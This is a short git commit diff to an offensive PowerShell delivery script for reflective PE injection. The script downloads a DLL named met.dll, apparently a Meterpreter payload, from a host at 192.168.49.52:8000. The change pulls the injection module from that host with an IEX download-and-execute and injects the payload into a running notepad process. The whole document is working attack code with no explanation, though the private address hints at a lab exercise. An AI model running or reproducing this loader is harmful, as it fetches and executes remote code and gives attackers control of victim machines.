dd5379f0212cc9e45d7066e5641cf070c98a1c59
FNGCrysis <johnv1202@gmail.com>
2021-07-16 18:35:18 -0700

    Update Powershell_ReflectivePEInjection_delivery.ps1

--- Powershell_ReflectivePEInjection_delivery.ps1
+++ Powershell_ReflectivePEInjection_delivery.ps1
@@ -1,5 +1,6 @@
 $bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.52:8000/met.dll')
-$procid = (Get-Process -Name explorer).Id
-Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
-
+$procid = (Get-Process -Name notepad).Id
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.49.52:8000/Invoke-ReflectivePEInjection.ps1')
+#Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+
